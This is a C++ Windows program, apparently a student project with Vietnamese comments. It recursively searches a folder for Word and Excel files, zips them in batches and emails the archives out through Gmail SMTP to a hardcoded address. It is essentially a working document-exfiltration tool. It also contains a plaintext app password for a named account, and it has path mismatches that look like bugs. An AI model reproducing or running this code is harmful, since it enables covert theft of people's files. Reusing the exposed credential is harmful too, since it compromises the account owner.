#include <Windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <algorithm>
#include <zip.h>
#include <shlwapi.h>
#include <filesystem>
#include <curl/curl.h>
#include <wincrypt.h>
#include <fstream>
using namespace std;
namespace fs = std::filesystem;
vector<wstring> file_path;
vector<wstring> file_name;
vector<string> file_hashes;
ULONGLONG g_latestToday = 0;   // giá trị lớn nhất trong hôm nay

string bytes_to_hex(const BYTE* data, DWORD len)
{
    static const char* hex = "0123456789abcdef";
    std::string out;
    out.reserve(len * 2);

    for (DWORD i = 0; i < len; ++i)
    {
        out.push_back(hex[data[i] >> 4]);
        out.push_back(hex[data[i] & 0x0F]);
    }
    return out;
}

string sha256_file(const std::wstring& path)
{
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;

    HANDLE hFile = CreateFileW(path.c_str(),
                               GENERIC_READ,
                               FILE_SHARE_READ,
                               NULL,
                               OPEN_EXISTING,
                               FILE_ATTRIBUTE_NORMAL,
                               NULL);

    if (hFile == INVALID_HANDLE_VALUE)
        return {};

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
    {
        CloseHandle(hFile);
        return {};
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
    {
        CloseHandle(hFile);
        CryptReleaseContext(hProv, 0);
        return {};
    }

    BYTE buffer[4096];
    DWORD bytesRead = 0;

    while (ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead)
    {
        CryptHashData(hHash, buffer, bytesRead, 0);
    }

    BYTE hash[32];
    DWORD hashLen = 32;
    CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashLen, 0);

    CloseHandle(hFile);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);

    return bytes_to_hex(hash, hashLen);
}

void save_hashes_to_file(const std::vector<std::string>& hashes)
{
    std::ofstream out("C:\\MyZipOutput\\hashes.txt", std::ios::trunc);

    for (const auto& h : hashes)
        out << h << "\n";
}

void load_hashes_from_file(std::vector<std::string>& hashes)
{
    std::ifstream in("C:\\MyZipOutput\\hashes.txt");
    std::string line;

    while (std::getline(in, line))
    {
        if (!line.empty())
            hashes.push_back(line);
    }
}
// ====== convert wstring -> UTF8 string ======
string wstring_to_utf8(const wstring& w)
{
    if (w.empty()) return {};
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &w[0], (int)w.size(), NULL, 0, NULL, NULL);
    string result(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &w[0], (int)w.size(), &result[0], size_needed, NULL, NULL);
    return result;
}


bool add_file(zip_t* archive, const wstring& wfilepath, const wstring& wname)
{
    string filepath = wstring_to_utf8(wfilepath);
    string name_in_zip = wstring_to_utf8(wname);

    zip_source_t* source = zip_source_file(archive, filepath.c_str(), 0, 0);
    if (!source)
    {
        cerr << "Cannot open file: " << filepath << endl;
        return false;
    }

    if (zip_file_add(archive, name_in_zip.c_str(), source, ZIP_FL_OVERWRITE | ZIP_FL_ENC_UTF_8) < 0)
    {
        cerr << "Add failed: " << filepath << endl;
        zip_source_free(source);
        return false;
    }

    return true;
}


bool ends_with(const wstring& s, const wstring& suffix) // hàm hỗ trợ lấy extension
{
    if (s.size() < suffix.size()) return false;
    return equal(suffix.rbegin(), suffix.rend(), s.rbegin());
}

bool HasTargetExtension(const wstring &name)
{
    wstring lower = name;
    transform(lower.begin(), lower.end(), lower.begin(), ::towlower);

    return
        ends_with(lower, L".docx") ||
        ends_with(lower, L".xlsx");
}

bool sendEmail(string folder)
{
    cout<<"Bat dau gui mail!\n";
    CURL *curl = curl_easy_init(); 
    if(!curl) return false;
    
    curl_easy_setopt(curl, CURLOPT_USERNAME, "n21dcat067@student.ptithcm.edu.vn");
    curl_easy_setopt(curl, CURLOPT_PASSWORD, "fkkj fwcl aocs jfpz");
    curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.gmail.com:587");
    curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);

    curl_easy_setopt(curl, CURLOPT_MAIL_FROM, "n21dcat067@student.ptithcm.edu.vn");
    struct curl_slist *recipients = NULL;
    recipients = curl_slist_append(recipients, "n21dcat067@student.ptithcm.edu.vn");
    curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

    curl_mime *mime = curl_mime_init(curl);

    // body email
    curl_mimepart *part = curl_mime_addpart(mime);
    curl_mime_data(part, "Attached ZIP files from folder.", CURL_ZERO_TERMINATED);


    for (const auto &entry : fs::directory_iterator(folder)) {
        if (entry.path().extension() == ".zip") {
            curl_mimepart *filepart = curl_mime_addpart(mime);
            curl_mime_filedata(filepart, entry.path().string().c_str());
            curl_mime_type(filepart, "application/zip");
            curl_mime_encoder(filepart, "base64");
            curl_mime_filename(filepart, entry.path().filename().string().c_str());
        }
    }

    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

    CURLcode res = curl_easy_perform(curl);

    curl_mime_free(mime);
    curl_slist_free_all(recipients);
    curl_easy_cleanup(curl);

    return res == CURLE_OK;
}


bool sendEmail_one_file(const std::wstring& wpath)
{
    CURL *curl = curl_easy_init();
    if (!curl) return false;

    curl_easy_setopt(curl, CURLOPT_USERNAME, "n21dcat067@student.ptithcm.edu.vn");
    curl_easy_setopt(curl, CURLOPT_PASSWORD, "<app_password>");
    curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.gmail.com:587");
    curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);

    curl_easy_setopt(curl, CURLOPT_MAIL_FROM, "n21dcat067@student.ptithcm.edu.vn");

    struct curl_slist *recipients = NULL;
    recipients = curl_slist_append(recipients, "n21dcat067@student.ptithcm.edu.vn");
    curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

    curl_mime *mime = curl_mime_init(curl);

    // body text
    curl_mimepart *part = curl_mime_addpart(mime);
    curl_mime_data(part, "Attached file.", CURL_ZERO_TERMINATED);

    // ====== file đính kèm ======
    std::string path_utf8 = wstring_to_utf8(wpath);

    curl_mimepart *filepart = curl_mime_addpart(mime);
    curl_mime_filedata(filepart, path_utf8.c_str());
    curl_mime_type(filepart, "application/octet-stream");
    curl_mime_encoder(filepart, "base64");

    // tên file trong email
    std::filesystem::path p(path_utf8);
    curl_mime_filename(filepart, p.filename().string().c_str());

    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

    CURLcode res = curl_easy_perform(curl);

    curl_mime_free(mime);
    curl_slist_free_all(recipients);
    curl_easy_cleanup(curl);

    return res == CURLE_OK;
}


void FindFile(const wstring &directory)  // dung đệ quy để duyệt hết cac file co trong thu muc
{
    wstring tmp = directory + L"\\*"; // đường đẫn gốc
    WIN32_FIND_DATAW file;
    HANDLE search_handle = FindFirstFileW(tmp.c_str(), &file);
    int count = 1;

    if (search_handle != INVALID_HANDLE_VALUE)
    {
        vector<wstring> directories; // lưu tạm thời thư mục con 

        do
        {
            if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) // nếu không phải thư mục thì không thõa mãn điều kiện
            {
                if ((!lstrcmpW(file.cFileName, L".")) || (!lstrcmpW(file.cFileName, L".."))) // kiểm tra có phải là thư mục cha hay còn có thư mục con 
                    continue;
            }

            tmp = directory + L"\\" + wstring(file.cFileName); // lấy path hiện tại đang đứng

            if (!(file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) 
            {
                if (HasTargetExtension(file.cFileName)) // kiem tra extension của file 
                {
                   string h = sha256_file(tmp);
                   bool exists = std::find(file_hashes.begin(), file_hashes.end(), h) != file_hashes.end();
                   if(!exists)
                    {
                        file_path.push_back(tmp);
                        file_name.push_back(file.cFileName);
                        file_hashes.push_back(h);
                        wcout << tmp << endl;
                    }
                }
            }
            else
            {
                directories.push_back(tmp);
            }
        }
        while (FindNextFileW(search_handle, &file)); // duyệt từng file trong thư mục

        FindClose(search_handle);

        for (auto &d : directories) // đệ quy khúc này 
            FindFile(d);
    }
}


void compress_to_disk()
{
    std::wstring output_dir = L"C:\\MyZipOutput";

    // tạo thư mục nếu chưa có
    if (!CreateDirectoryW(output_dir.c_str(), NULL))
    {
        if (GetLastError() != ERROR_ALREADY_EXISTS)
        {
            std::wcout << L"Khong tao duoc thu muc output\n";
            return;
        }
    }

    size_t total = file_path.size();
    const size_t chunk_size = 2;   // mỗi file zip chứa 5 file
    int batch = 1;

    for (size_t i = 0; i < total; i += chunk_size)
    {
        std::wstring zip_full =
            output_dir + L"\\batch_" + std::to_wstring(batch) + L".zip";

        std::string zip_utf8 = wstring_to_utf8(zip_full);

        int err = 0;
        zip_t* archive = zip_open(zip_utf8.c_str(),
                                  ZIP_CREATE | ZIP_TRUNCATE,
                                  &err);

        if (!archive)
        {
            std::wcout << L"Khong tao duoc file zip: " << zip_full << std::endl;
            continue;
        }

        std::wcout << L"\n=== Tao ZIP: " << zip_full << std::endl;

        for (size_t j = i; j < i + chunk_size && j < total; ++j)
        {

            if (add_file(archive, file_path[j], file_name[j]))
            {
                std::wcout << L"  + da them: " << file_path[j] << std::endl;
            }
            else
            {
                std::wcout << L"  - loi file: " << file_path[j] << std::endl;
            }
        }

        zip_close(archive);

        std::wcout << L" Da tao xong: " << zip_full << std::endl;
        wstring path = L"C:\\ZipOutput\\batch_" + std::to_wstring(batch) + L".zip";

        if(sendEmail_one_file(path))
        {
             cout<< "send email success!";
        }
        else{
            cout<<"Failed";
        }

        batch++;
    }
}

int main()
{
    load_hashes_from_file(file_hashes);
    // while(true)
    // {
    file_path.clear();
    file_name.clear();
    FindFile(L"C:\\Work_space");
    if (file_path.empty()) {
        //std::wcout << L"Khong tim thay file nao de nen\n";
        //continue;
    }
    compress_to_disk();
    // string folder = "C:\\MyZipOutput";
    // if(sendEmail(folder))
    // {
    //     cout<< "send email success!";
    // }
    // else
    // {
    //     cout<<"Failed";
    // }
    save_hashes_to_file(file_hashes);
    system("pause");
    return 0;
}
